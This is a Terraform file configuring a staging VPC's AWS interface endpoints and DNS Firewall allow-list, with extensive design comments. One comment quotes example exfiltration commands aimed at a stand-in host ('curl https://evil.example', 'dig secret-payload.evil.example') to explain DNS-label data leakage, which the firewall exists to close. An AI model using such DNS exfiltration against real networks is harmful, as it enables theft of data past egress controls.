# staging/egress/ - Staging's [E] metered network (Stage 3 pass 3): step 8's endpoint list with
# step 9's org policy on every entry, and the DNS Firewall. Lifecycle belongs to
# `make up ENV=staging` / `make down ENV=staging` (D11), never to a by-hand apply (runbook,
# "What you never do"); `./aws/egress.py` 6 is the burn meter.
#
# foundation/'s [P] facts arrive through terraform_remote_state - never pasted (Lesson 3).

data "terraform_remote_state" "foundation" {
  backend = "s3"

  config = {
    bucket = "awsds-${var.env}-tfstate"
    key    = "${var.account_folder}/foundation/terraform.tfstate"
    region = var.region
  }
}

module "egress" {
  # checkov:skip=CKV_TF_1:pinned by git TAG by convention (conventions §6, Stage 3 step 1.1a) - a repository-internal tag only the repo owner can move
  source = "git::git@github.com:felipenoris/AWS-DataScience.git//terraform-modules/vpc-egress?ref=vpc-egress-v0.11.1"

  env    = var.env
  vpc_id = data.terraform_remote_state.foundation.outputs.vpc_id

  # Single-AZ resources land in the first authored zone (D9) - a selection, not an anchor.
  #
  # `egress_mode`, `nat_public_subnet_id` and `private_route_table_ids` went with the NAT at
  # `vpc-egress-v0.6.0` (6c step 5.1, 2026-09-06). Under D38 the estate has one internet exit, an
  # explicit proxy in the hub, and no VPC carries a default route - so there is no design to select
  # and no route table for this slice to write to.
  endpoint_subnet_id         = data.terraform_remote_state.foundation.outputs.private_subnet_ids[var.zone_ids[0]]
  endpoint_security_group_id = data.terraform_remote_state.foundation.outputs.endpoints_security_group_id

  # Step 8.3: the three SageMaker endpoints - the same list as Sandbox since 2026-08-17, when the
  # NFS requirement was withdrawn (D24 with it).
  #
  # `datazone` is absent, removed 2026-08-25 (issue #39). Its private DNS zone is authoritative for
  # the whole subtree, so agent.datazone.<region>.api.aws - which the portal front-end reaches over
  # the public internet - was NXDOMAIN for every client of the VPC resolver. Measured in Sandbox
  # 2026-08-24 (Lessons 40-42).
  #
  # The rule outlives the entry: no endpoint whose private zone shadows a name the client plane
  # requires may live in the VPC the client resolves through. The 2026-08-25 objectives
  # clarification puts the full-tunnel laptop on a VPC resolver by requirement (D5, re-scoped to
  # the compute plane). Any future endpoint seizing an `api.aws` spelling inherits the rule.
  #
  # Under design B the entry comes back - with no NAT there is no other path from the app to
  # DataZone - and the shadowing comes back with it, so B also has to move the portal off the
  # resolver (architecture.md §4.3).
  #
  # The rest of the required table (docs/SMUS.md §VpcOnly, fifteen names) is added by measurement
  # and not by copying: verification (viii) reads the flow logs of a working session, and only what
  # is exercised gets an endpoint, at +USD 0.010/h each, per account, for the whole session.
  #
  # Two entries of that table cannot be settled by adding them here:
  #   s3   this account already has a [P] gateway endpoint whose prefix-list route is more
  #        specific than any default, so S3 traffic may never reach an interface endpoint at
  #        all - and the request then presents the gateway's aws:SourceVpce. Which one wins,
  #        per project subnet, is verification (xix); flow logs are the wrong instrument
  #        (gateway traffic crosses no ENI), the field is CloudTrail's vpcEndpointId.
  #   q    the doc pairs it with com.amazonaws.US-EAST-1.codewhisperer, and an interface
  #        endpoint is regional - so under design B the Amazon Q surface has no private path
  #        from us-west-2 at all. Record what breaks at 4.3 rather than assuming either way.
  extra_services = ["sagemaker.api", "sagemaker.runtime", "sagemaker.studio"]

  # The firewall's job since 6c step 5.7 (2026-09-06) is the resolver, not the route. Step 5.1
  # removed the last default route in the estate (D38), so nothing in this VPC opens an internet
  # connection except as a client of the proxy - and an explicit-proxy client never resolves the
  # name it asks for; Squid does.
  #
  # Removing the route did not close the resolver. `curl https://evil.example` cannot leave this
  # VPC; `dig secret-payload.evil.example` would have, one label at a time, through the VPC's own
  # recursive resolver. Closing that channel is this control's remaining job, and it is why the
  # list below is ten entries rather than sixty-three: the names this VPC must resolve to function.
  dns_firewall = true

  # TRUST, because the only names left on the list below are AWS's own namespaces and this estate's
  # own private zones: the chain beneath an entry is pointed by AWS or by us. INSPECT would turn
  # any AWS-internal CNAME leaving `*.amazonaws.com` into a resolution failure with no owner and no
  # remedy. Package hosts are Squid's now, and Squid matches the hostname the client requested, so
  # no redirection chain is evaluated anywhere in the estate.
  firewall_domain_redirection_action = "TRUST_REDIRECTION_DOMAIN"

  # The old list's sixty-three entries - every package host, console family, sign-in name and the
  # one CDN wildcard - moved to the proxy's source-scoped allow-lists in `production/networking/`
  # (step 4.9), where they became two filters instead of one: what a person on the tunnel may reach
  # is no longer the same set as what a notebook may reach. A VPC has one resolver, so this list
  # could never express that split.
  #
  # A `"*"` came off here too. Commit `f6bb316` ("allow-all egress", 2026-08-23) put a single
  # wildcard at the top of the list; `*` matches every name, so the sixty-two entries beneath it
  # were decoration and the firewall was a default-allow. Named rather than quietly dropped,
  # because a list whose first entry is `*` reads as a configured control to every review that does
  # not read it to the end (Lesson 5).
  #
  # EXC-04, EXC-05 and EXC-06 close with the old list, and EXC-05's failure mode retires outright
  # rather than moving: it needed a resolver evaluating a redirection chain and blaming the
  # original name for a hop's absence. The filter that replaced it never sees a chain.
  dns_firewall_allow_domains = [
    # Every entry carries a trailing dot - EXC-04's repair (2026-09-06). Route 53 Resolver
    # canonicalises a domain list as FQDNs and returns `amazonaws.com.`; written without one, the
    # provider compared two spellings of the same list and re-issued `UpdateFirewallDomains` on
    # every apply, so `terraform plan` read `0 to add, 2 to change` immediately after a successful
    # apply of this very code. Measured on a live list before being written: dotting these entries
    # alone took the plan from `2 to change` to `1 to change`, and `vpc-egress-v0.10.0` dots the
    # module's catch-all for the other half.
    #
    # AWS's own namespaces. Every regional service endpoint lives under one of these and they
    # cannot be enumerated, which is why they are wildcards rather than names. The apex is listed
    # beside each wildcard because a Route 53 domain-list wildcard never matches the apex itself.
    # Squid collapses that syntax: there, `.amazonaws.com` covers both and listing the apex beside
    # it is fatal. Two systems, one intent, two spellings (Lesson 53).
    "amazonaws.com.", "*.amazonaws.com.",
    "api.aws.", "*.api.aws.",

    # `sagemaker.aws` is covered by neither of the above, and omitting it is how this slice would
    # pay hourly for an endpoint nothing can resolve: `sagemaker.studio` answers on
    # `*.studio.<region>.sagemaker.aws`, a different TLD entirely. `vpc-egress-v0.8.0`'s
    # precondition turns that from a silent NXDOMAIN into a plan-time failure naming the endpoint.
    "sagemaker.aws.", "*.sagemaker.aws.",

    # `app.aws` and `on.aws` - two more families of endpoints this VPC already pays for, added
    # 2026-09-09 (6d step 8.8). An interface endpoint answers for several names and the module used
    # to read only the service's canonical one, so two of them were invisible to the coverage
    # check. Read from the endpoints themselves -
    #
    #   ecr.dkr           dkr-ecr.<region>.on.aws            (and `*.dkr-ecr.<region>.on.aws`)
    #   sagemaker.studio  studio.sagemaker.<region>.app.aws  (and its wildcard)
    #
    # - both NXDOMAIN in this VPC until then, which is this list's own failure mode: a paid endpoint
    # unreachable by one of its names, reported as a network fault rather than as a policy decision.
    #
    # `on.aws` also makes `dzd-<id>.sagemaker.<region>.on.aws` resolvable, the Unified Studio
    # domain's own URL, which 6d step 8.6 recorded as a DNS BLOCK from every space address and could
    # attribute to nothing. Resolving is not reaching: that name has no endpoint, so it leaves as a
    # proxy request and comes back a 403 naming the host. The reach question is the plane's, and
    # this list does not answer it (D38).
    "app.aws.", "*.app.aws.",
    "on.aws.", "*.on.aws.",

    # The estate's own private zones - `proxy.awsds.internal` and `gitlab.awsds.internal` among
    # them, which is why a client can be told to use a name for the proxy rather than an address.
    # Listed as siblings because `awsds.internal` does not cover `awsds-pages.internal`: a
    # different label, not a subdomain. The old family (`sandbox.internal`, `prod.internal`,
    # `pages.internal`) is absent - an entry here is what would keep a retired zone alive past
    # step 2.6.
    "awsds.internal.", "*.awsds.internal.",
    "awsds-pages.internal.", "*.awsds-pages.internal.",
  ]

  # Athena Spark's three session endpoints are absent by decision (Lesson 5; Stage 6 decision 3,
  # 2026-08-19): athena.sessions (Spark Connect), athena.dashboard (Live UI) and
  # athena.persistent-dashboard (History Server). Athena Spark runs its executors outside this VPC
  # - there is no NetworkConfiguration in its API - so a notebook on it sits outside these
  # endpoints, the flow logs and every aws:SourceVpce condition. The preventive half is the SCP
  # deny on athena:StartSession/UpdateSession (Stage 6 step 1.6); not creating these is the free
  # network half, and it is a choice since the 2026-04 PrivateLink release.
  #
  # The SQL path is unaffected and must stay so: Athena SQL rides the `athena` API endpoint (the
  # module's core list), which is what D13 depends on. Three names in the same family, two
  # different products.
  #
  # Revision trigger: Athena Spark gaining executors in this estate's subnets under its security
  # group - never a headline saying it "supports VPC", which is about the control path.

}
